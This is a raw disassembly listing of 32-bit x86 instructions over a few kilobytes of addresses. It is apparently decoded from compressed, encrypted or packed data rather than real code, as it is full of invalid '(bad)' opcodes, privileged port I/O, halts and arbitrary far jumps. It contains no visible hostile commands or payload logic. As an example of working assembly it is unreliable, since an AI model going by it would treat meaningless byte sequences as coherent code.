  42a366:	lods   eax,DWORD PTR ds:[esi]
  42a367:	lds    eax,FWORD PTR [ecx+0x60]
  42a36a:	jo     0x42a3ad
  42a36c:	push   edx
  42a36d:	xchg   eax,ebx
  42a36f:	fdiv   st(3),st
  42a371:	push   edx
  42a372:	cs push ecx
  42a374:	mov    edx,ebx
  42a376:	jbe    0x42a3f0
  42a378:	mov    eax,ds:0x404c77cd
  42a37d:	test   al,0x20
  42a37f:	jl     0x42a341
  42a381:	pop    eax
  42a382:	or     DWORD PTR [esi+ebp*1+0xb65144],0xffffffba
  42a38a:	and    eax,0x4c9ff162
  42a38f:	xor    al,0x61
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xe7a4073d
  42a403:	sbb    al,0x82
  42a405:	les    eax,FWORD PTR [ecx]
  42a407:	add    BYTE PTR ds:0xd3000001,al
  42a40d:	jecxz  0x42a3ec
  42a40f:	push   ebp
  42a410:	cmp    BYTE PTR [eax+0x6b],0xf5
  42a414:	in     eax,dx
  42a415:	jle    0x42a3e7
  42a417:	add    BYTE PTR [eax-0x6cc90af2],dl
  42a41d:	mov    ds:0xef64b14c,al
  42a422:	jb     0x42a3be
  42a424:	hlt    
  42a425:	sbb    bh,BYTE PTR [ebp+ecx*4-0x5b]
  42a429:	popa   
  42a42a:	pop    ecx
  42a42b:	inc    esi
  42a42c:	xchg   edx,eax
  42a42d:	fsub   st,st(1)
  42a42f:	sbb    eax,0xddaf0a9f
  42a434:	and    ebx,DWORD PTR [ebp+0x21]
  42a437:	fdiv   DWORD PTR ds:0xce6c1a89
  42a43d:	fnstsw WORD PTR [ecx+0x29]
  42a440:	dec    esp
  42a441:	xor    BYTE PTR [ecx-0x27],ch
  42a444:	mov    eax,DWORD PTR [edi-0x433d20aa]
  42a44a:	jns    0x42a478
  42a44c:	adc    al,0xcd
  42a44e:	arpl   WORD PTR [eax+0x4f],ax
  42a451:	or     BYTE PTR [ecx-0x10a53a4a],al
  42a457:	mov    al,0x48
  42a459:	pop    ebx
  42a45a:	stc    
  42a45b:	add    dh,BYTE PTR [ecx+0x1068f2ca]
  42a461:	enter  0xa1d1,0x3c
  42a465:	pop    ss
  42a466:	rcl    BYTE PTR [ebx+0x3ab39909],0x12
  42a46d:	jp     0x42a4b0
  42a46f:	sar    BYTE PTR [esp+eax*2+0x4f],cl
  42a473:	ficomp DWORD PTR [esi-0x371ae76d]
  42a479:	fisubr DWORD PTR [eax+0xd]
  42a47c:	repz sbb BYTE PTR es:[edi],dl
  42a480:	mov    ds:0xaaf2dbc5,eax
  42a485:	sub    DWORD PTR [ebp+0xc],esi
  42a488:	hlt    
  42a489:	(bad)  
  42a48a:	mov    ds:0x1d2b995a,al
  42a48f:	call   0x1474360e
  42a494:	fild   DWORD PTR [esi-0xa]
  42a497:	fld    TBYTE PTR [ebp+ebp*2-0x4c]
  42a49b:	into   
  42a49c:	les    edi,FWORD PTR [edi]
  42a49e:	cs fsubp st(7),st
  42a4a1:	add    esp,DWORD PTR [esi]
  42a4a3:	icebp  
  42a4a4:	loope  0x42a480
  42a4a6:	sub    eax,0xd2e96f09
  42a4ab:	mov    ah,dl
  42a4ad:	mov    ebx,DWORD PTR [ecx+0x49e90220]
  42a4b3:	inc    esp
  42a4b4:	fild   DWORD PTR [edi+0x36f4711f]
  42a4ba:	add    DWORD PTR [ebx],ecx
  42a4bc:	enter  0x121,0xf4
  42a4c0:	fidiv  DWORD PTR [eax-0x10]
  42a4c3:	outs   dx,BYTE PTR ds:[esi]
  42a4c4:	das    
  42a4c5:	clc    
  42a4c6:	scas   al,BYTE PTR es:[edi]
  42a4c7:	cwde   
  42a4c8:	ds jge 0x42a477
  42a4cb:	jl     0x42a536
  42a4cd:	lea    eax,[eax+ebx*1+0x44af7613]
  42a4d4:	mov    bh,bl
  42a4d6:	loope  0x42a48a
  42a4d8:	sub    al,0xe
  42a4da:	(bad)  
  42a4db:	lock scas al,BYTE PTR es:[edi]
  42a4dd:	test   DWORD PTR [edi+0x32],esi
  42a4e0:	aaa    
  42a4e1:	js     0x42a4ea
  42a4e3:	mov    ds:0x7c73b3fe,eax
  42a4e8:	push   edx
  42a4e9:	shl    DWORD PTR [ebx],0xc7
  42a4ec:	mov    edx,esi
  42a4ee:	sub    BYTE PTR [esi+edi*2+0xd0306fb],0x61
  42a4f6:	jne    0x42a526
  42a4f8:	pop    ds
  42a4f9:	jno    0x42a4f4
  42a4fb:	mov    dh,0x37
  42a4fd:	sbb    esp,DWORD PTR [edi]
  42a4ff:	aad    0x22
  42a501:	scas   eax,DWORD PTR es:[edi]
  42a502:	sbb    DWORD PTR [esi],eax
  42a504:	mov    bh,BYTE PTR [eax+esi*4]
  42a507:	out    0x8f,al
  42a509:	cmp    BYTE PTR [edi-0x5c5774c5],cl
  42a50f:	test   BYTE PTR [edi+0x0],dh
	...
  42a572:	add    BYTE PTR [eax],al
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xe61c6b9f
  42a583:	test   BYTE PTR [edi+0x50001c5],0x1
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	adc    DWORD PTR [edx-0x43],edx
  42a58f:	rcl    ebx,cl
  42a591:	push   eax
  42a592:	(bad)  
  42a594:	(bad)  
  42a596:	push   0xb3f3242
  42a59b:	pop    eax
  42a59c:	imul   edi,DWORD PTR [ebx+eax*2+0x66f489bb],0xc860d209
  42a5a7:	gs mov eax,0xcac3373e
  42a5ad:	mov    dl,0xd4
  42a5af:	leave  
  42a5b0:	mov    dh,ah
  42a5b2:	sub    ch,BYTE PTR [edx+0x69]
  42a5b5:	lds    ebp,FWORD PTR [ebp+0x72]
  42a5b8:	stos   DWORD PTR es:[edi],eax
  42a5b9:	fst    DWORD PTR [ecx]
  42a5bb:	push   cs
  42a5bc:	push   cs
  42a5bd:	adc    DWORD PTR [eax+ebp*4+0x63],edx
  42a5c1:	mov    ebx,0x82115218
  42a5c6:	jge    0x42a55d
  42a5c8:	clc    
  42a5c9:	mov    bl,ah
  42a5cb:	push   esp
  42a5cc:	mov    al,0x4c
  42a5ce:	lods   al,BYTE PTR ds:[esi]
  42a5cf:	inc    edx
  42a5d0:	mov    ch,0x12
  42a5d2:	cmp    DWORD PTR [ebp-0x1e],0xffffff99
  42a5d6:	mov    WORD PTR [ecx+0x67],fs
  42a5d9:	fistp  WORD PTR [eax-0x25]
  42a5dc:	repz icebp 
  42a5de:	leave  
  42a5df:	jnp    0x42a5af
  42a5e1:	mov    ah,0xb6
  42a5e3:	inc    esi
  42a5e4:	into   
  42a5e5:	push   ecx
  42a5e6:	sbb    DWORD PTR fs:[edi-0x2bca14e7],0xffffff82
  42a5ee:	sahf   
  42a5ef:	mov    ds:0x9592e2e2,al
  42a5f4:	push   DWORD PTR [eax-0x3c56b662]
  42a5fa:	adc    DWORD PTR [esi+0x7d1223ec],ebp
  42a600:	or     al,0xf0
  42a602:	sbb    BYTE PTR [eax+0x1597bf8d],dl
  42a608:	sbb    al,0x19
  42a60a:	inc    esp
  42a60b:	fistp  DWORD PTR [ecx-0x12]
  42a60e:	lock gs (bad) 
  42a611:	fdivr  QWORD PTR [eax+0x38]
  42a614:	mov    esp,0x7bcf9ade
  42a619:	out    0x2e,eax
  42a61b:	pop    esp
  42a61c:	in     eax,0xb4
  42a61e:	cmp    eax,0x1a7c11fb
  42a623:	in     eax,dx
  42a624:	push   eax
  42a625:	loopne 0x42a69f
  42a627:	out    dx,eax
  42a628:	xor    eax,0x839e9521
  42a62d:	int    0x4f
  42a62f:	into   
  42a630:	arpl   WORD PTR [ebp+eiz*2+0x46874592],dx
  42a637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a638:	add    edx,edx
  42a63a:	(bad)  
  42a63b:	out    dx,eax
  42a63c:	sbb    DWORD PTR [ebx+0x594e0f91],0xf
  42a643:	jmp    0x2b3eb50e
  42a648:	sbb    BYTE PTR [ecx-0x7395cafb],bh
  42a64e:	sub    al,BYTE PTR [esi+0x33cd57d7]
  42a654:	mov    dl,0x59
  42a656:	lahf   
  42a657:	or     al,0xbd
  42a659:	cli    
  42a65a:	shl    ah,0xe
  42a65d:	ins    DWORD PTR es:[edi],dx
  42a65e:	pop    ebp
  42a65f:	loop   0x42a6af
  42a661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a662:	fwait
  42a663:	dec    ecx
  42a664:	jle    0x42a644
  42a666:	pop    ds
  42a667:	mov    WORD PTR cs:[edx+0x6458c304],?
  42a66e:	xor    eax,0xac44de0f
  42a673:	mov    ecx,0x44f30e1e
  42a678:	xchg   ebp,eax
  42a679:	jne    0x42a6fa
  42a67b:	(bad)  
  42a67c:	and    edx,DWORD PTR [ecx+0x522c1bff]
  42a682:	cmp    BYTE PTR cs:[edx],bl
  42a685:	mov    ecx,DWORD PTR [edx+0x79]
  42a688:	mov    cs,WORD PTR [esp-0x54]
  42a68c:	add    eax,0x31d218cb
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi+0x69b8131c],0x8c277cca
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0x9c000001
  42a70d:	dec    ecx
  42a70e:	mov    ebp,0xa36017d3
  42a713:	pop    eax
  42a714:	xchg   edx,eax
  42a715:	cmc    
  42a716:	es into 
  42a718:	inc    esp
  42a719:	dec    dh
  42a71b:	fsubr  QWORD PTR [esi]
  42a71d:	shr    BYTE PTR [ebp+0x10591ab4],1
  42a723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a724:	jmp    0x42a797
  42a726:	popa   
  42a727:	cmc    
  42a728:	pop    es
  42a729:	dec    ebp
  42a72a:	mov    edi,0x84cd948f
  42a72f:	dec    ecx
  42a730:	lods   al,BYTE PTR ds:[esi]
  42a731:	dec    ebx
  42a732:	repnz push es
  42a734:	das    
  42a735:	xchg   BYTE PTR [edi+0x51],ch
  42a738:	lea    esi,[edi+0x75f035c6]
  42a73e:	cmc    
  42a73f:	ins    DWORD PTR es:[edi],dx
  42a740:	inc    ebx
  42a741:	xchg   esp,eax
  42a742:	and    eax,0x12bc381
  42a747:	je     0x42a6d4
  42a749:	call   0x28c3075c
  42a74e:	add    dh,BYTE PTR [ebx+0x6f]
  42a751:	fild   DWORD PTR [eax]
  42a753:	sar    DWORD PTR [eax+0xe7583b6],0xf7
  42a75a:	scas   al,BYTE PTR es:[edi]
  42a75b:	enter  0x8c4f,0x68
  42a75f:	mov    ah,0x54
  42a761:	out    dx,al
  42a762:	lds    ebp,FWORD PTR [ecx]
  42a764:	cwde   
  42a765:	outs   dx,BYTE PTR ds:[esi]
  42a766:	retf   
  42a767:	dec    ebx
  42a768:	push   ebx
  42a769:	and    ecx,DWORD PTR ds:0x7fb11eaf
  42a76f:	fwait
  42a770:	dec    edx
  42a771:	mov    ds:0xef91ee85,eax
  42a776:	lea    esi,[ebp-0x71e25a7d]
  42a77c:	and    edx,edx
  42a77e:	retf   0x4aa
  42a781:	stos   DWORD PTR es:[edi],eax
  42a782:	enter  0x8f98,0x21
  42a786:	dec    esp
  42a787:	lock dec edi
  42a789:	fstp   QWORD PTR [ebp-0x3dab8f70]
  42a78f:	pop    es
  42a790:	ins    BYTE PTR es:[edi],dx
  42a791:	clc    
  42a792:	jo     0x42a7bd
  42a794:	inc    edx
  42a795:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a796:	sub    edi,DWORD PTR [edx+0x3e2cd518]
  42a79c:	icebp  
  42a79d:	in     eax,dx
  42a79e:	in     eax,0xc0
  42a7a0:	rcr    BYTE PTR [edx+0x20],0x2e
  42a7a4:	jecxz  0x42a7bd
  42a7a6:	mov    ds:0x59b0f85a,al
  42a7ab:	mov    dh,0xb6
  42a7ad:	dec    esi
  42a7ae:	jmp    0x808d:0x39759805
  42a7b5:	ins    DWORD PTR es:[edi],dx
  42a7b6:	outs   dx,DWORD PTR ds:[esi]
  42a7b7:	cli    
  42a7b8:	(bad)  
  42a7b9:	mov    ebp,0xd5d67e3e
  42a7be:	nop
  42a7bf:	sbb    al,0xdf
  42a7c1:	jp     0x42a7a5
  42a7c3:	mov    esp,0xc6fefa10
  42a7c8:	sub    BYTE PTR [edx-0x2b],bl
  42a7cb:	out    dx,eax
  42a7cc:	inc    eax
  42a7cd:	jp     0x42a767
  42a7cf:	popa   
  42a7d0:	mov    ch,bh
  42a7d2:	add    eax,esi
  42a7d4:	push   cs
  42a7d5:	mov    al,ds:0xff4ee3e7
  42a7da:	push   0xcf55c6ee
  42a7df:	mov    ecx,0x13dda6f8
  42a7e4:	xchg   edi,eax
  42a7e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7e6:	stos   BYTE PTR es:[edi],al
  42a7e7:	(bad)  
  42a7e8:	scas   eax,DWORD PTR es:[edi]
  42a7e9:	aas    
  42a7ea:	mov    edx,DWORD PTR [edi+0x1d]
  42a7ed:	cdq    
  42a7ee:	jmp    edi
  42a7f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7f1:	in     al,dx
  42a7f2:	into   
  42a7f3:	into   
  42a7f4:	cvtps2pd xmm3,QWORD PTR [edx+0x562354bd]
  42a7fb:	aam    0x1a
  42a7fd:	pop    ebx
  42a7fe:	push   es
  42a7ff:	mov    ds:0x6b79fdb6,eax
  42a804:	icebp  
  42a805:	cmp    edx,ecx
  42a807:	adc    eax,0x7c3d6057
  42a80c:	aaa    
  42a80d:	mov    esi,0xa8930e
	...
  42a872:	add    BYTE PTR [eax],al
  42a874:	mov    ah,BYTE PTR [ebp+0x63]
  42a877:	mov    edi,0x75debfef
  42a87c:	add    ebp,0x2d616c97
  42a882:	mov    ds,WORD PTR [edx+0x1c791]
  42a888:	add    eax,0xd000001
  42a88d:	mov    ebx,ebp
  42a88f:	and    dl,BYTE PTR [esi-0x20c47935]
  42a895:	pop    ecx
  42a896:	xchg   ebp,eax
  42a897:	and    cl,BYTE PTR [ebx]
  42a899:	inc    esi
  42a89a:	lods   eax,DWORD PTR ds:[esi]
  42a89b:	push   0x6489f5ab
  42a8a0:	xchg   ebp,eax
  42a8a1:	repnz bound edi,QWORD PTR [ebx]
  42a8a4:	jbe    0x42a8ad
  42a8a6:	cmp    BYTE PTR [edx+ebp*2-0x27],dh
  42a8aa:	inc    esi
  42a8ab:	mov    dl,0xe1
  42a8ad:	cld    
  42a8ae:	cmc    
  42a8af:	xlat   BYTE PTR ds:[ebx]
  42a8b0:	mov    ebx,0xc87e7f16
  42a8b5:	sub    cl,ch
  42a8b7:	addr16 mov edi,ebp
  42a8ba:	test   edx,eax
  42a8bc:	inc    BYTE PTR [esi-0xd]
  42a8bf:	dec    esi
  42a8c0:	nop
  42a8c1:	add    bh,BYTE PTR [edx+edi*1-0x57451001]
  42a8c8:	push   edi
  42a8c9:	xchg   ebp,edx
  42a8cb:	enter  0x38b,0x8
  42a8cf:	or     esi,esi
  42a8d1:	call   0x8817e5e5
  42a8d6:	mov    edx,0xbc79baaa
  42a8db:	mov    ah,0x4
  42a8dd:	enter  0x9a19,0xb1
  42a8e1:	or     DWORD PTR ds:0x9b27d583,eax
  42a8e7:	push   es
  42a8e8:	fldenv [edx+ecx*4-0x36]
  42a8ec:	rol    BYTE PTR [esi],cl
  42a8ee:	jno    0x42a872
  42a8f0:	arpl   WORD PTR [ebx+ebp*2],bp
  42a8f3:	cdq    
  42a8f4:	mov    al,0xd1
  42a8f6:	outs   dx,DWORD PTR ds:[esi]
  42a8f7:	mov    esp,DWORD PTR [eax-0x1c004e2d]
  42a8fd:	sbb    BYTE PTR [edx],ch
  42a8ff:	sub    eax,0xcddbcb0d
  42a904:	xchg   esi,eax
  42a905:	sbb    al,0x28
  42a907:	lods   eax,DWORD PTR ds:[esi]
  42a908:	loop   0x42a92b
  42a90a:	adc    eax,0x9c85f462
  42a90f:	dec    edx
  42a910:	mov    esp,0x48f7bdc
  42a915:	mov    ah,0x5f
  42a917:	inc    edx
  42a918:	push   ecx
  42a919:	and    al,0xcb
  42a91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a91c:	and    esi,DWORD PTR [ecx]
  42a91e:	fisubr DWORD PTR [edi+0x50]
  42a921:	inc    edx
  42a922:	or     BYTE PTR [ebx+edi*2+0x7008198f],dl
  42a929:	mov    al,ds:0xbb34178b
  42a92e:	push   ecx
  42a92f:	stos   BYTE PTR es:[edi],al
  42a930:	or     eax,0x6df637d6
  42a935:	sti    
  42a936:	ret    
  42a937:	stc    
  42a938:	mov    ecx,DWORD PTR [ebx+0x7f]
  42a93b:	add    BYTE PTR [esi],bh
  42a93d:	dec    edx
  42a93e:	cmp    al,0xe3
  42a940:	fmul   QWORD PTR [edi]
  42a942:	(bad)  
  42a943:	push   esi
  42a944:	fxtract 
  42a946:	in     al,0xfc
  42a948:	push   ebx
  42a949:	fmul   DWORD PTR [esp+ecx*4+0x1e]
  42a94d:	ficom  DWORD PTR [esi+esi*1-0x4e]
  42a951:	push   ds
  42a952:	sbb    DWORD PTR [edx+0x422a7121],edi
  42a958:	std    
  42a959:	pop    ds
  42a95a:	mov    edx,0x4d4baed1
  42a95f:	ret    
  42a960:	cmp    BYTE PTR [eax],0x2
  42a963:	aas    
  42a964:	cmp    BYTE PTR [edi-0x1b],dl
  42a967:	mov    al,ds:0x6f66be3
  42a96c:	or     BYTE PTR [edx],cl
  42a96e:	xchg   esp,eax
  42a96f:	adc    ch,BYTE PTR fs:[eax]
  42a972:	out    dx,eax
  42a973:	adc    ch,ch
  42a975:	mov    al,ds:0xc31540f4
  42a97a:	inc    ebx
  42a97b:	inc    edi
  42a97c:	xchg   esp,eax
  42a97d:	sti    
  42a97e:	popf   
  42a97f:	daa    
  42a980:	jnp    0x42a941
  42a982:	aad    0x2
  42a984:	fstp   TBYTE PTR [ecx+0x1e]
  42a987:	outs   dx,BYTE PTR ds:[esi]
  42a988:	gs scas al,BYTE PTR es:[edi]
  42a98a:	add    DWORD PTR [eax+0x2e],edi
  42a98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a98e:	es inc ecx
  42a990:	outs   dx,BYTE PTR ds:[esi]
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	sbb    ebx,DWORD PTR [edx-0x3769f228]
  42aa06:	add    DWORD PTR [eax],eax
  42aa08:	add    eax,0x9e000001
  42aa0d:	sbb    al,0x88
  42aa0f:	in     eax,0x30
  42aa11:	mov    ebx,0x13909f12
  42aa16:	mov    eax,0x58750ecf
  42aa1b:	or     dl,BYTE PTR [ebp+0x2ba63dd4]
  42aa21:	push   0x5c
  42aa23:	lock jecxz 0x42aa49
  42aa26:	out    0x81,al
  42aa28:	mov    ds:0x7b454678,eax
  42aa2d:	pop    eax
  42aa2e:	cdq    
  42aa2f:	popa   
  42aa30:	dec    esi
  42aa31:	les    edi,FWORD PTR [ebx+0x6d]
  42aa34:	pop    ss
  42aa35:	(bad)  [esi+edi*4+0x7cb94902]
  42aa3c:	xor    ebp,ebx
  42aa3e:	mov    bl,0x3e
  42aa40:	in     al,dx
  42aa41:	jp     0x42aa1f
  42aa43:	sti    
  42aa44:	mov    bl,0x75
  42aa46:	inc    esi
  42aa47:	push   es
  42aa48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa49:	inc    esp
  42aa4a:	pop    esi
  42aa4b:	leave  
  42aa4c:	(bad)  
  42aa4d:	loopne 0x42aa33
  42aa4f:	xor    ch,BYTE PTR [ebx+eiz*1+0x65d66e24]
  42aa56:	pop    esi
  42aa57:	mov    eax,ds:0x9cfbe291
  42aa5c:	and    edx,esp
  42aa5e:	sbb    BYTE PTR [edx+0x7febb7d4],dh
  42aa64:	clc    
  42aa65:	pop    es
  42aa66:	dec    ecx
  42aa67:	cmp    al,0xda
  42aa69:	test   al,0xcd
  42aa6b:	sbb    BYTE PTR [ecx],dh
  42aa6d:	(bad)  [ebx+0x62]
  42aa70:	jl     0x42aac1
  42aa72:	cmp    bl,BYTE PTR [eax]
  42aa74:	pop    esi
  42aa75:	mov    dh,BYTE PTR [edi+0x4c7e2bb2]
  42aa7b:	push   ecx
  42aa7c:	dec    edx
  42aa7d:	(bad)  
  42aa7e:	fwait
  42aa7f:	push   eax
  42aa80:	sbb    dh,dh
  42aa82:	fimul  DWORD PTR [edi+0x71cf33b9]
  42aa88:	push   ebp
  42aa89:	add    bl,BYTE PTR ds:0x44133035
  42aa8f:	jo     0x42aa36
  42aa91:	cmp    ecx,DWORD PTR [ebp+0x3]
  42aa94:	xchg   ecx,edx
  42aa96:	arpl   WORD PTR ds:0x79c17a9b,di
  42aa9c:	mov    ch,0xf0
  42aa9e:	adc    DWORD PTR [edi],0xffffffd7
  42aaa1:	add    DWORD PTR gs:[edi+eax*1],esp
  42aaa5:	stos   DWORD PTR es:[edi],eax
  42aaa6:	ror    ah,cl
  42aaa8:	rol    DWORD PTR [ebp+0x61],cl
  42aaab:	push   es
  42aaac:	push   0x58
  42aaae:	mov    ebp,0xd4b46e0b
  42aab3:	rol    DWORD PTR [ebx],cl
  42aab5:	call   0xbdf3ff2b
  42aaba:	test   al,0x22
  42aabc:	ins    BYTE PTR es:[edi],dx
  42aabd:	or     esi,0x9d250c7
  42aac3:	jno    0x42aa6d
  42aac5:	rol    eax,1
  42aac7:	mov    DWORD PTR [edi-0x449bb5a2],edi
  42aacd:	and    al,0x3
  42aacf:	mov    WORD PTR ds:0xd15c9743,gs
  42aad5:	xchg   BYTE PTR [edx+0x37],bl
  42aad8:	out    0xdb,al
  42aada:	icebp  
  42aadb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aadc:	leave  
  42aadd:	sub    cl,BYTE PTR ds:0xa73240a6
  42aae3:	push   esi
  42aae4:	add    al,0xf4
  42aae6:	sbb    eax,ebp
  42aae8:	mov    bl,0x33
  42aaea:	cmp    ch,BYTE PTR [edx]
  42aaec:	test   DWORD PTR [ebp+edi*4-0x6f03ad5],ecx
  42aaf3:	xchg   esi,eax
  42aaf4:	fistp  DWORD PTR [edx+eiz*2-0x7d]
  42aaf8:	dec    eax
  42aaf9:	adc    al,0x76
  42aafb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aafc:	cmp    DWORD PTR [edx+0x572b4ecb],edx
  42ab02:	dec    edi
  42ab03:	cmp    esi,DWORD PTR [ecx+edx*1+0x65]
  42ab07:	ror    DWORD PTR [esi-0x11],cl
  42ab0a:	sbb    eax,0xee711e34
  42ab0f:	mov    ebp,0xed
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	fs push edi
  42ab82:	pushf  
  42ab83:	cmp    eax,0x1c99b
  42ab88:	add    eax,0x3a000001
  42ab8d:	push   0xffffffc6
  42ab8f:	push   DWORD PTR [ebx]
  42ab91:	mov    esp,0x8a27565c
  42ab96:	iret   
  42ab97:	in     eax,0x5
  42ab99:	mov    bh,0xda
  42ab9b:	cmp    dl,al
  42ab9d:	bswap  edx
  42ab9f:	retf   0xcf
  42aba2:	sar    DWORD PTR [edi],1
  42aba4:	popf   
  42aba5:	mov    dl,0xc2
  42aba7:	pop    eax
  42aba8:	or     al,0x2a
  42abaa:	retf   0xcee6
  42abad:	mov    cl,0x3f
  42abaf:	js     0x42abba
  42abb1:	pop    esp
  42abb2:	lods   al,BYTE PTR ds:[esi]
  42abb3:	adc    cl,BYTE PTR [edi+0x36]
  42abb6:	sbb    al,0x46
  42abb8:	lods   al,BYTE PTR ds:[esi]
  42abb9:	dec    esp
  42abba:	in     al,dx
  42abbb:	mov    al,ds:0xff910bbf
  42abc0:	pop    ebx
  42abc1:	mov    BYTE PTR [ebx+0x3cf97a47],bl
  42abc7:	sbb    ah,BYTE PTR ds:0xaec60241
  42abcd:	js     0x42abf0
  42abcf:	enter  0xcdce,0x24
  42abd3:	xchg   ecx,eax
  42abd4:	mov    ch,0x3a
  42abd6:	pop    esi
  42abd7:	sub    BYTE PTR [eax+0x37],0x27
  42abdb:	xor    ebx,ebx
  42abdd:	xchg   ebp,eax
  42abde:	std    
  42abdf:	popa   
  42abe0:	in     al,dx
  42abe1:	mov    bl,0x18
  42abe3:	mov    esi,0x959030ea
  42abe8:	ficom  WORD PTR [ecx+0x23a573f1]
  42abee:	mov    al,cl
  42abf0:	test   edi,esp
  42abf2:	lods   al,BYTE PTR ds:[esi]
  42abf3:	out    dx,al
  42abf4:	jno    0x42abcc
  42abf6:	cmp    eax,0xda867476
  42abfb:	seta   BYTE PTR [edx]
  42abfe:	ret    0xd009
  42ac01:	out    dx,eax
  42ac02:	jmp    0x42ac83
  42ac04:	xchg   edx,eax
  42ac05:	push   DWORD PTR [edx-0x68]
  42ac08:	pusha  
  42ac09:	test   ebx,edx
  42ac0b:	ja     0x42abc9
  42ac0d:	adc    dl,BYTE PTR [edi+esi*4]
  42ac10:	inc    edi
  42ac11:	imul   DWORD PTR [esi+0x54ea78fd]
  42ac17:	cmp    BYTE PTR [ecx+0x43],cl
  42ac1a:	int3   
  42ac1b:	adc    edi,DWORD PTR [ebp-0x6c2ee522]
  42ac21:	rol    eax,1
  42ac23:	sbb    bl,BYTE PTR [ecx+0x68cec97d]
  42ac29:	inc    ecx
  42ac2a:	jge    0x42aca4
  42ac2c:	inc    eax
  42ac2d:	dec    edx
  42ac2e:	mov    BYTE PTR [edi-0x17dd282f],dl
  42ac34:	int    0xf6
  42ac36:	jp     0x42ac00
  42ac38:	out    0x4f,al
  42ac3a:	xchg   esp,eax
  42ac3b:	repz xor BYTE PTR [eax],dh
  42ac3e:	ss mov ecx,0xe9278624
  42ac44:	jns    0x42abfe
  42ac46:	add    DWORD PTR [ebx+edi*2],0xffffffd7
  42ac4a:	pushf  
  42ac4b:	and    al,0xd3
  42ac4d:	pop    eax
  42ac4e:	ins    BYTE PTR es:[edi],dx
  42ac4f:	jo     0x42ac6f
  42ac51:	clc    
  42ac52:	jle    0x42ac9c
  42ac54:	adc    al,0xe2
  42ac56:	mov    es,esp
  42ac58:	scas   eax,DWORD PTR es:[edi]
  42ac59:	in     al,dx
  42ac5a:	sub    edi,esi
  42ac5c:	jmp    0x42abef
  42ac5e:	sahf   
  42ac5f:	jmp    0x4b6b:0x698eb8e2
  42ac66:	fst    QWORD PTR [ebp+0x64]
  42ac69:	xchg   edx,eax
  42ac6a:	push   ecx
  42ac6b:	iret   
  42ac6c:	cmp    al,0x81
  42ac6e:	xchg   esi,eax
  42ac6f:	std    
  42ac70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac71:	in     al,dx
  42ac72:	(bad)  
  42ac74:	sbb    al,0xcf
  42ac76:	mov    edi,0x6a572165
  42ac7b:	popf   
  42ac7c:	les    esi,FWORD PTR [esi]
  42ac7e:	push   edx
  42ac7f:	xchg   ebx,eax
  42ac80:	push   0x75c9e5fa
  42ac85:	or     ebx,esp
  42ac87:	fwait
  42ac88:	std    
  42ac89:	sbb    eax,0x512daad9
  42ac8e:	stos   BYTE PTR es:[edi],al
  42ac8f:	jl     0x42ac2a
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	jg     0x42ad37
  42ad02:	mov    ecx,0x1caa01b
  42ad07:	add    BYTE PTR ds:0xd2000001,al
  42ad0d:	lahf   
  42ad0e:	mov    al,0xb
  42ad10:	cmp    eax,0x7b12d59e
  42ad15:	ror    ah,1
  42ad17:	lods   al,BYTE PTR ds:[esi]
  42ad18:	dec    eax
  42ad19:	scas   al,BYTE PTR es:[edi]
  42ad1a:	int    0x80
  42ad1c:	cmp    al,0x34
  42ad1e:	adc    al,0x9b
  42ad20:	xor    ah,bl
  42ad22:	fs cmp eax,0xfaae1260
  42ad28:	test   al,0x4d
  42ad2a:	add    ch,al
  42ad2c:	test   DWORD PTR ds:0xbbe61f6,esp
  42ad32:	fs (bad) 
  42ad34:	adc    bl,dl
  42ad36:	scas   eax,DWORD PTR es:[edi]
  42ad37:	out    0x26,eax
  42ad39:	mov    ch,0xbd
  42ad3b:	fwait
  42ad3c:	mov    bh,0xdd
  42ad3e:	adc    eax,0xcaca30a2
  42ad43:	jo     0x42ad27
  42ad45:	pop    ebx
  42ad46:	inc    ebp
  42ad47:	jnp    0x42ad8e
  42ad49:	(bad)  
  42ad4a:	adc    eax,0xb3c1540b
  42ad4f:	nop
  42ad50:	pop    ss
  42ad51:	inc    edi
  42ad52:	pop    esi
  42ad53:	loop   0x42acec
  42ad55:	push   ebp
  42ad56:	inc    ecx
  42ad57:	or     ebp,esi
